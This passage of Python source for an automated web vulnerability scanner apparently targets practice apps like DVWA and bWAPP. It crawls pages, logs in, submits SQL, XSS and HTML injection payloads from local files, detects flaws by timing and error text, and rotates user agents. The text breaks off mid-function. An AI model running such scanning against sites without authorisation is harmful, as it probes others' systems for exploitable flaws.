import html
import random
from colorama import Fore
import requests
import urllib.parse
import urllib.request
import warnings
from bs4 import BeautifulSoup
from bs4 import MarkupResemblesLocatorWarning
import argparse
import os
from CustomImports import html_report
from Config import config
import re


warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)
firstCallSpider = 1

# DVWA : https://github.com/digininja/DVWA


class DataStorage:
    def __init__(self):
        self.xss_inj = None
        self.urls = set()
        self.related_domains = set()
        self.links_other = set()
        self.sql_dict = {}
        self.html_inj = []

    # https://github.com/payloadbox/sql-injection-payload-list
    # https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
    def payloads(self, p_type):  # returns a list of payloads depending on the chosen type
        try:
            # Get the payload type from the Payload Local Repo.
            if p_type == 'SQL':
                for filename in os.listdir(os.getcwd() + '/Payloads/SQL'):
                    with open(os.path.join(os.getcwd() + '/Payloads/SQL', filename), 'r', encoding="utf8") as f:
                        self.sql_dict[filename.split('.')[0]] = f.read().splitlines()
                f.close()
                all_sql_values = []
                for value in self.sql_dict.values():
                    if isinstance(value, list):
                        all_sql_values.extend(value)
                    else:
                        all_sql_values.append(value)
                return all_sql_values
            # https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Payloads.txt
            elif p_type == 'HTML':
                for filename in os.listdir(os.getcwd() + '/Payloads/HTML'):
                    with open(os.path.join(os.getcwd() + '/Payloads/HTML', filename), 'r', encoding="utf8") as f:
                        self.html_inj = f.readlines()
                f.close()
                return self.html_inj
            # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
            elif p_type == 'XSS':
                for filename in os.listdir(os.getcwd() + '/Payloads/XSS'):
                    with open(os.path.join(os.getcwd() + '/Payloads/XSS', filename), 'r', encoding="utf8") as f:
                        self.xss_inj = f.readlines()
                f.close()
                return self.xss_inj
        except Exception as e:
            print(Fore.RED + "\n[ERROR] Something went wrong. Payload files cannot be read.")
            print(Fore.RESET)
            print("Error: ", e)
            pass

    def inject_type(self, p_type):
        try:
            # Based on filename, get the injection type, used for SQL.
            for key, value in self.sql_dict.items():
                if isinstance(value, list) and p_type in value:
                    return key
            return None
        except Exception as e:
            print(Fore.RED + "\n[ERROR] Something went wrong. Injection type cannot be resolved to this payload")
            print(Fore.RESET)
            print("Error: ", e)
            pass

    # https://github.com/koutto/jok3r-pocs/blob/master/exploits/drupal-cve-2014-3704/exploit-drupal-cve-2014-3704.py
    @staticmethod
    def random_agent_gen():
        user_agent = [
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9',
            'Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
            'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
            'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
        # returns random legitimate user agent
        return random.choice(user_agent)


class ScanConfigParameters:
    def __init__(self, url):
        try:
            # Initialize Scanner Configuration Parameters.
            self.url = url
            # Initialize Session for current run
            self.session = requests.Session()
            # Initialize Data Storage.
            self.DataStorage = DataStorage()
            # Initialize Config File
            self.config_params = config.Config().config_object
            # Empty list of links pairs used for hierarchy.
            self.link_pairs = []
            # Setup initial requirements and prepare files.
            self.setup()
            # Initialize the ignored links and errors file parameters
            self.ignored_links = None
            self.err_file = None
        except Exception:
            print(Fore.RED + "\n[ERROR] Something went wrong during initialization. Quitting..\n")
            print(Fore.RESET)
            print("Error: ", e)
            quit()

    def setup(self):
        try:  # Test connection
            test_get = self.session.get(self.url)
            if test_get.status_code == 404:  # If page is not found, scanner will not start.
                print("[Error] Bad URL provided (404). Quitting..")
                quit()
        except requests.ConnectionError:  # If ConnectionError identified, try to change the HTTP protocol.
            try:  # Switch to HTTP if HTTPs is unsupported
                self.url = self.url.replace("https://", "http://")
                self.session.get(self.url)
            except requests.ConnectionError:  # Switch to HTTPs if HTTP is unsupported
                self.url = self.url.replace("http://", "https://")
                self.session.get(self.url)
        except Exception as e:
            print(Fore.RED + "\n[ERROR] Something went wrong while testing the initial connection. Quitting..\n")
            print(Fore.RESET)
            print("Error: ", e)
            quit()

        try:  # Create Error file
            # Try to read an exiting error file, create one is none is found.
            self.err_file = open('err_file.log', 'a')
            # Check if file is empty before writing.
            if os.stat('err_file.log').st_size == 0:
                self.err_file.write("Error File\n")
        except Exception as e:
            print(Fore.RED + "\n[ERROR] Something went wrong when opening the Error File. Quitting..\n")
            print(Fore.RESET)
            print("Error: ", e)
            quit()

        try:  # Import Ignored URLs from Config file.
            self.ignored_links = self.config_params['URLS']['ignored'].split(",")
        except Exception as e:
            print(Fore.RED + "\n[ERROR] Something went wrong when opening the Ignored Links file. Quitting..\n")
            print(Fore.RESET)
            print("Error: ", e)
            quit()


class Utilities(ScanConfigParameters):
    def __init__(self, url, username=None, password=None):  # Inherits Config Class
        ScanConfigParameters.__init__(self, url)

    def process_login(self, username, password, sec_level=None):
        try:
            # Check for username and password if provided, do nothing if not provided.
            if username and password:
                # Extract the login form information to perform login.
                if self.extract_do_login(self.session.get(self.url).url, username, password, sec_level):
                    print("Login Successful")
                    return True
                else:
                    print("Login Failed. Make sure you provided the right credentials.")
                    quit()
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when attempting to process the login.")
            quit()

    def extract_do_login(self, url, username, password, sec_level=None):
        try:
            # Treat login form as usual form, extract it.
            login_form = self.extract_forms(url)
            for l_form in login_form:
                # Extract form details and check where data needs to be populated, position one generally username,
                # position two, generally password.
                login_data_new = self.extract_form_details(l_form)
                for idx, (key, value) in enumerate(login_data_new.items()):
                    if login_data_new[key]:
                        continue
                    else:
                        if idx == 0:
                            login_data_new[key] = username
                        elif idx == 1:
                            login_data_new[key] = password
                    # Check if the app requires a "security_level" - test for BWapp App.
                    if key == "security_level" and sec_level is None:
                        sec_level = str(
                            input("Please provide desired security level (0. low, 1. medium, 2. high). \nOption: "))
                        if self.check_sec_input(sec_level):
                            login_data_new[key] = sec_level
                    elif key == "security_level" and sec_level:
                        login_data_new[key] = sec_level
                # Do login and check redirect to index page.
                login_response = self.submit_form(url, l_form, login_data_new)
                if login_response.url != url:
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when attempting to extract the login details. Quitting..",
                                      url)
            quit()

    def check_sec_input(self, sec_level):
        try:
            # Check if provided security level is valid recursively.
            if str(sec_level) != '0' and str(sec_level) != '1' and str(sec_level) != '2':
                sec_level = str(input("Please provide choose a valid option (0. low, 1. medium, 2. high)! \nOption: "))
                self.check_sec_input(sec_level)
            return sec_level
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when checking security level (BWapp).")
            pass

    def spider(self, url):
        try:
            # Check if this is the first call, and if it is, add the provided URL to the list.
            global firstCallSpider
            if firstCallSpider:
                self.link_pairs.append(['-1', url])
                response = self.session.get(url)
                #print("Provided URL", url)
                #print("Actual URL", self.session.get(url).url)
                self.DataStorage.urls.add(url)
                firstCallSpider = 0
            else:
                response = self.session.get(url)
            #print("Provided URL", url)
            #print("Actual URL", self.session.get(url).url)
            # If 200, then endpoint is accessible
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                # Build up URls list by extracting all hrefs and anchors
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href and not href.startswith('#'):
                        extracted_url = urllib.parse.urljoin(url, href)
                        # Ensure the app does not scan other webapps by checking if the harvested URL has the same domain as the URL provided by user.
                        if re.search("^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/?\n]+)", extracted_url).group(1) == re.search("^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/?\n]+)",
                                                                                                                                    self.url).group(1):
                            # Add URLs to main list object, ignore the user - ignored ones.
                            # [[a.html,b.html], [b.html,c.html], [a,d], [a,g], [g,h], [b,j]]
                            if extracted_url not in self.DataStorage.urls and not any(ignored in extracted_url for ignored in self.ignored_links):
                                self.link_pairs.append([url, extracted_url])
                                self.DataStorage.urls.add(extracted_url)
                                self.spider(extracted_url)
                        else:
                            # self.DataStorage.related_domains.add(extracted_url)
                            html_report.add_external_link(extracted_url)
            # IF it's not 200 and not 4XX, means that there are some ways of accessing the URL.
            if (response.status_code != 200 and response.status_code != 404 and response.status_code != 500) or (
                    str(response.status_code).startswith('4') and response.status_code != 404):
                html_report.add_external_link(url)
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when crawling for links.", url)
            pass

    def extract_headers(self, url):
        try:
            # Get headers of an URL.
            return self.session.get(url).headers
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when getting the headers.", url)
            pass

    def extract_forms(self, url):
        try:
            # Extract all forms from an URL.
            response = self.session.get(url, timeout=300)
            response.raise_for_status()
            parsed_html = BeautifulSoup(response.content, "html.parser")
            return parsed_html.findAll("form")
        except requests.HTTPError as e:
            self.print_except_message('error', e,
                                      "Something went wrong when extracting forms from links. A HTTP error occurred.",
                                      url)
            pass
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting forms from links.", url)
            pass

    def extract_form_details(self, form):
        form_data = {}
        try:
            # Extract input fields and their names from the form
            input_fields = form.find_all('input')
            for field in input_fields:
                if field.get('name'):
                    if (str(field.get('name')).lower() == 'submit') or (str(field.get('type')).lower() == 'submit') or (str(field.get('name')).lower() == 'user_token'):
                        form_data[field.get('name')] = field.get('value')
                        continue
                    form_data[field.get('name')] = ''  # might need back field.get('value', '')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting forms details.")
            pass

        try:
            # Extract button fields - for action (submit, search, etc.)
            form_fields = form.find_all('button')
            for field in form_fields:
                if field.get('name'):
                    if (str(field.get('name')).lower() == 'submit') or (str(field.get('type')).lower() == 'submit') or (str(field.get('name')).lower() == 'user_token'):
                        form_data[field.get('name')] = field.get('value')
                        continue
                    form_data[field.get('name')] = '' # field.get('value', 'submit')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting forms details.")
            pass

        try:
            # Extract Select for drop-downs
            form_option = form.find_all('select')
            for field in form_option:
                if field.get('name'):
                    form_data[field.get('name')] = ''
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting forms details.")
            pass

        try:
            # Extract Textarea for big inputs (wall of texts)
            form_textarea = form.find_all('textarea')
            for field in form_textarea:
                if field.get('name'):
                    form_data[field.get('name')] = ''
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting forms details.")
            pass
        return form_data

    def extract_iframes(self, url):
        try:
            # Extract iFrames the same way forms are extracted
            response = self.session.get(url, timeout=300)
            response.raise_for_status()
            parsed_html = BeautifulSoup(response.content, "html.parser")  # , from_encoding="iso-8859-1")
            return parsed_html.findAll("iframe")
        except requests.HTTPError as e:
            self.print_except_message('error', e,
                                      "Something went wrong when extracting iframes from links. A HTTP error occurred",
                                      url)
            pass
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting iframes from links.", url)
            pass

    def extract_inputs(self, url):
        try:
            # Extract Inputs the same way forms are extracted
            response = self.session.get(url, timeout=300)
            response.raise_for_status()
            parsed_html = BeautifulSoup(response.content, "html.parser")  # , from_encoding="iso-8859-1")
            return parsed_html.findAll("input")
        except requests.HTTPError as e:
            self.print_except_message('error', e,
                                      "Something went wrong when extracting inputs from links. A HTTP error occurred",
                                      url)
            pass
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting inputs from links.", url)
            pass

    def build_iframe_url(self, url, iframe, payload):
        try:  # Get the src value of the iframe to get the destination of the payload.
            url = url.copy()
            if iframe['src'] in url:
                url = url.replace(iframe['src'], payload)
                return url
            return None
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when building iframe URL.", url)
            pass

    def submit_form(self, url, form, form_data):
        try:
            # Get the action (URL or PATH)
            action = form.get("action")
            # Get the method (GET, POST, PUT etc.)
            if form.get("method"):
                method = form.get("method").upper()
            else:
                return 0
            # Check if action is URL or if it is path relative to URL.
            if action:
                if action.startswith('http'):
                    action_url = action
                else:
                    action_url = urllib.parse.urljoin(url, action)
            else:
                action_url = url
            # Send data accordingly to method.
            if method == 'GET':
                response = self.session.get(action_url, params=form_data, timeout=10)
            else:
                response = self.session.post(action_url, data=form_data, timeout=10)
            response.raise_for_status()
            return response
        except requests.HTTPError:
            # pass as the application is unable to handle the error
            # self.print_except_message('error', e, "Something went wrong when submitting a form. A HTTP error occurred", url)
            pass
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when submitting a form.", url)
            pass

    def custom_user_agent(self, user_agent):
        try:
            # Create custom user-agent based on provided input
            return {'User-Agent': user_agent}
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when modifying the User-Agent.")
            pass

    def extract_injection_fields_from_form(self, form_data):
        try:
            keys_to_populate = []
            # Find the emtpy form values, meaning they await user input, add them to a list and return the list
            for key, value in form_data.items():
                if form_data[key]:
                    continue
                else:
                    keys_to_populate.append(key)
            return keys_to_populate
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting the empty inputs from a form.")
            pass

    def extract_name_value(self, form_data):
        try:
            if 'name' in str(form_data):
                return form_data['name']
            return 0
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting name value from a form.")
            pass

    def extract_cookies(self):
        try:
            return self.session.cookies.get_dict()
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when saving cookies.")
            pass

    def check_scan_build_url(self, url, username=None, password=None, static_scan=None, sec_level=None):
        try:
            # Full scan required
            if static_scan is None:
                # Check if static scan is not required
                if self.session.get(url, timeout=300).url != url or "login" in self.session.get(url, timeout=300).url:
                    # if username or password not provided and are required, throw error
                    if not (username and password):
                        print("You need to provide login credentials first, check --help for details!")
                        quit()
                    # If login is required and static scan not, do login and crawl web app.
                    elif self.process_login(username, password, sec_level):
                        # Scan first time for URL provided by Main, then continue with others.
                        self.spider(url)
                else:
                    # If login is not required, perform crawling.
                    self.spider(url)

            # Static Scan required
            else:
                if self.session.get(url, timeout=300).url != url or "login" in self.session.get(url, timeout=300).url:
                    # if username or password not provided and are required, throw error
                    if not (username and password):
                        print("You need to provide login credentials first, check --help for details!")
                        quit()
                    elif self.process_login(username, password, sec_level):
                        self.DataStorage.urls.add(url)
            html_report.create_tree(self.link_pairs)
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when checking for login requirements or scan options. Quitting..")
            quit()

    def extract_non_form_inputs(self, url):
        try:
            name_list = []
            action_urls = []
            input_list = self.extract_inputs(url)
            for input in input_list:
                name_list.append(self.extract_name_value(input))
            for name in name_list:
                action_urls.append(str(url + '?' + str(name) + '='))
            return action_urls
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting non-form inputs", url)
            pass

    def extract_forms_and_form_data(self, url):
        try:
            form_list = []
            form_data_list = []
            # Extract forms from each URL
            for form in self.extract_forms(url):
                # For each form extract the details needed for payload submission
                form_data = self.extract_form_details(form)
                # Ignore page default forms
                if any([True for key, value in form_data.items() if key == 'form_security_level' or key == 'form_bug']):
                    continue
                form_list.append(form)
                form_data_list.append(form_data)
            return form_list, form_data_list
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting form and form data", url)
            pass

    def no_form_input_content(self, url, payload):
        try:
            # Extract inputs outside of form or with no method/action in form
            input_list_fin = set()
            form_data = {}
            response_list = []
            soup = BeautifulSoup(self.session.get(url, timeout=300).content, 'html.parser')
            input_list = soup.findAll('input')
            # Get all inputs that have a form parent but no action or button.
            for input in input_list:
                if input.find_parent('form'):
                    parent_attr = input.find_parent('form').attrs
                    if not (('action' in parent_attr) or ('button' in parent_attr)):
                        input_list_fin.add(input)
                else:
                    # Get inputs with no form parent
                    input_list_fin.add(input)

            if input_list_fin:
                for field in input_list_fin:
                    if field.get('name'):
                        form_data[field.get('name')] = payload

            # Harvest page for scripts containing path, since none can be found
            # Brute-force inputs for destination path.
            potential_paths = re.findall(r'["\']([^"\']*\.php)["\']', self.session.get(url).text)
            # Get the regex groups of each path of the URL: 0 is http(s), 1 is the domain, 2,3,4 etc., are the paths /
            scheme_match = re.compile(r'^(https?:\/\/[^\/]+)').match(url)
            base_domain = scheme_match.group(0)
            # Split the path into segments
            path = url[len(base_domain):].strip('/')
            path_segments = path.split('/')
            # Initialize the list of groups
            groups = [base_domain]
            # Build the groups dynamically
            for i in range(len(path_segments)):
                groups.append(f"{base_domain}/{'/'.join(path_segments[:i + 1])}")

            potential_paths = set(potential_paths)
            for potential_path in potential_paths:
                # Ignore the items from the ignored list
                if any(ignored in str(potential_path) for ignored in self.ignored_links):
                    continue
                if '../' in potential_path:
                    # If app is browsing for the relative resource ../example.php, we need to go back the same about of paths in the current URL as we have ../ in the identified new paths
                    new_url = str(groups[-potential_path.count('../') - 1]) + "/" + potential_path.replace("../", "")
                else:
                    new_url = url + potential_path
                if self.session.get(new_url).status_code == 200:
                    response_list.append(self.session.post(new_url, params=form_data))
            return response_list
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when extracting inputs outside of forms or with forms with no method.",
                                      url)
            pass

    def check_hidden_tag(self, url, form_data):
        try:
            inputs = self.extract_inputs(url)
            for input in inputs:
                if input['name'] in form_data:
                    if input['type'] == 'hidden':
                        return True
            return False
        except Exception:
            # Ignore if input not found
            pass

    def print_except_message(self, m_type, error=None, custom_message=None, url=None): #TODO: Add timestamp to errors
        try:
            if m_type == 'warning':
                if error:
                    if custom_message:
                        print(Fore.LIGHTRED_EX + "\n[WARNING] " + custom_message)
                        print(Fore.RESET)
                        print(error)
                    else:
                        print(Fore.LIGHTRED_EX + "\n[WARNING] " + error)
                else:
                    if custom_message:
                        print(Fore.LIGHTRED_EX + "\n[WARNING] " + custom_message)

            if m_type == 'error':
                if error:
                    if custom_message:
                        print(Fore.RED + "\n[ERROR] " + str(
                            custom_message) + "\nPlease check the Error file for additional details.")
                        if url:
                            print(Fore.RED + "\n[ERROR] URL:" + str(url) + "\nDetails: " + str(
                                custom_message) + "\nError Details: " + str(error), file=self.err_file)
                        else:
                            print(Fore.RED + "\n[ERROR] " + "\nDetails: " + str(
                                custom_message) + "\nError Details: " + str(error), file=self.err_file)
                    else:
                        print(Fore.RED + "\n[ERROR] Please check the Error file for additional details.")
                        if url:
                            print(Fore.RED + "\n[ERROR] URL:" + str(url) + "\nError Details: " + error,
                                  file=self.err_file)
                        else:
                            print(Fore.RED + "\n[ERROR] " + str(error), file=self.err_file)
            print(Fore.RESET)
        except Exception as e:
            print(Fore.RED + "[ERROR] Something went wrong when printing to Error File.", e)
            print(Fore.RESET)
            pass

    def extract_xml_tags(self, url):
        try:
            pattern_tags = r'xmlHttp\.send\("([^"]+)"\);'
            pattern_uri = r'xmlHttp\.open\("POST","([^"]+)"'
            match_tags = re.search(pattern_tags, self.session.get(url).text, re.DOTALL)
            match_uri = re.search(pattern_uri, self.session.get(url).text, re.DOTALL)

            if match_tags and match_uri:
                extracted_xml = match_tags.group(1)
                extracted_uri = match_uri.group(1)
                return extracted_uri, extracted_xml
            return None, None
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when extracting XML tags.", url)
            pass

    def pretty_sql(self, sql_type_input):
        try:
            if sql_type_input == "{'auth_sql'}":
                return 'Authentication Bypass SQL Injection'
            elif sql_type_input == "{'error_sql'}":
                return 'Error Based SQL Injection'
            elif sql_type_input == "{'generic_sql'}":
                return 'Generic SQL Injection'
            elif sql_type_input == "{'sqlite_sql'}":
                return 'SQLite SQL Injection'
            elif sql_type_input == "{'time_based_sql'}":
                return 'Time Based SQL Injection'
            elif sql_type_input == "{'union_select_sql'}":
                return 'Union Select SQL Injection'
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when SQL Types.")
            pass


# Scanner class handles scan jobs
class Scanner(Utilities):
    def __init__(self, url, username=None, password=None, static_scan=None, comprehensive_scan=None):
        self.Utils = Utilities.__init__(self, url, username, password)
        self.comprehensive_scan = comprehensive_scan
        self.static_scan = static_scan
        self.check_scan_build_url(url, username, password, static_scan)
        self.username = username
        self.password = password

    def scan(self):
        try:
            # Scan app
            # self.scan_browser_cache()
            # self.scan_xst()
            # self.scan_hhi()
            # self.scan_http()
            # self.scan_hsts()
            # self.scan_ria()
            # self.scan_robotstxt()

            # Scan harvested URLs
            for url in self.DataStorage.urls:
                # # Form and URL scan
                #
                #self.scan_html(url) # Check why so slow
                self.scan_iframe(url)
                self.scan_code_exec(url)
                self.scan_php_exec(url)
                self.scan_ssi(url)
                self.scan_sql(url)
                self.scan_role_def_dir(url)
                self.scan_role_def_cookie(url)
                # self.scan_session(url) # TODO : Fix Strong Sessions
                self.scan_xss(url)
                self.scan_idor(url)
                self.scan_cors(url)
                self.scan_ssrf(url)
                self.scan_xml_generic(url)
                self.scan_lfi(url)
                self.scan_js(url)
                self.scan_comments(url)

            html_report.write_html_report()  # TODO: Prettify report
            return
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when attempting to initialize scan function. Quitting..")
            quit()

    # Injections

    def t_i_sql(self, url, form, form_data):
        try:
            # Initialize default Confidence for forms/URLs and SQL types list
            confidence = 0
            sql_type_list = set()
            time_based = False
            # Get Initial ~ normal response time with no Payload
            response_wo_1 = self.submit_form(url, form, "")
            if not response_wo_1:
                return 0, 0, 0
            response_time_wo_1 = response_wo_1.elapsed.total_seconds()
            response_time_wo_2 = self.submit_form(url, form, "").elapsed.total_seconds()
            response_time_wo_3 = self.submit_form(url, form, "").elapsed.total_seconds()

            if not response_time_wo_1 or not response_time_wo_2 or not response_time_wo_3:
                return 0, 0, 0

            # Create average response time
            avg_response_time = (response_time_wo_1 + response_time_wo_2 + response_time_wo_3) / 3

            # Find the injection points for the SQL Payload
            injection_keys = self.extract_injection_fields_from_form(form_data)
            for sql_payload in self.DataStorage.payloads("SQL"):
                # Populate injection keys with payloads.
                for injection_key in injection_keys:
                    form_data[injection_key] = sql_payload
                # Check time based only once, heavy load on time of execution.
                if (time_based and confidence > 2) and self.DataStorage.inject_type(sql_payload) == 'time_based_sql':
                    continue
                response_injected = self.submit_form(url, form, form_data)
                if not response_injected:
                    continue
                payload_response_time = response_injected.elapsed.total_seconds()
                # Get time of response and check.
                if payload_response_time > avg_response_time and payload_response_time > 2:  # and (time_based is False or confidence < 2):
                    # Vulnerable to Time based SQL type X, increase confidence
                    confidence += 1
                    sql_type_list.add(self.DataStorage.inject_type(sql_payload))
                    time_based = True

                if "error" in response_injected.text.lower(): # TODO: Fix generic FP rate for 'error' alone in response.
                    confidence += 1
                    sql_type_list.add(self.DataStorage.inject_type(sql_payload))
                # Check if comprehensive scan is required, if not, jump out on 3 vulnerabilities hit, for time management.

                if self.comprehensive_scan is False and confidence > 1:
                    return True, sql_type_list, confidence
                # Check if vulnerability is found or not, if comprehensive is required.
                elif self.comprehensive_scan is True and sql_payload == self.DataStorage.payloads("SQL")[
                    -1] and confidence > 0:
                    return True, sql_type_list, confidence
            return False, [], 0
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for SQL Injection.", url)
            pass

    def t_i_sql_nfi(self, url):
        try:
            for sql_payload in self.DataStorage.payloads("SQL"):
                if not self.DataStorage.inject_type(sql_payload) == 'time_based_sql':
                    continue
                response_injected = self.no_form_input_content(url, sql_payload)
                if not response_injected:
                    return 0
                for response_inj in response_injected:
                    if response_inj.elapsed.total_seconds() > 4.5:
                        return True
            return False
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when testing for SQL Injection with no form inputs.", url)
            pass

    def t_i_ua_sql(self, url):
        try:
            # Get Initial ~ normal response time with no Payload
            response_time_wo = self.session.get(url, timeout=300).elapsed.total_seconds()
            # Check only one time injection as it keeps the app loading for a long time if all time payloads are injected
            for sql_payload in self.DataStorage.payloads("SQL"):
                # Inject headers with payloads
                headers = self.custom_user_agent(sql_payload)
                try:
                    response = self.session.get(url, timeout=300, headers=headers)
                except Exception:
                    continue
                # Check response type (time or feedback)
                if response.elapsed.total_seconds() > response_time_wo and response.elapsed.total_seconds() > 2:
                    return True
                if "error" in response.text.lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for User-Agent SQL Injection.",
                                      url)
            pass

    def t_i_xml_sql(self, url):
        try:
            # Get Initial ~ normal response time with no Payload
            response_time_wo = self.session.get(url, timeout=300).elapsed.total_seconds()
            # Check only one time injection as it keeps the app loading for a long time if all time payloads are injected
            for sql_payload in self.DataStorage.payloads("SQL"):
                # Inject XML with custom payloads
                prepared_url, custom_payload = self.t_i_xml(url, sql_payload)
                if prepared_url and custom_payload:
                    try:
                        response = self.session.post(prepared_url, data=custom_payload, headers={'Content-Type': 'application/xml'})
                    except Exception:
                        continue
                else:
                    break
                # Check response type (time or feedback)
                if response.elapsed.total_seconds() > response_time_wo and response.elapsed.total_seconds() > 2:
                    return True
                if "error" in response.text.lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for SQL Injection in XML tags.",
                                      url)
            pass

    def scan_sql(self, url):
        try:
            # Scan inputs in form
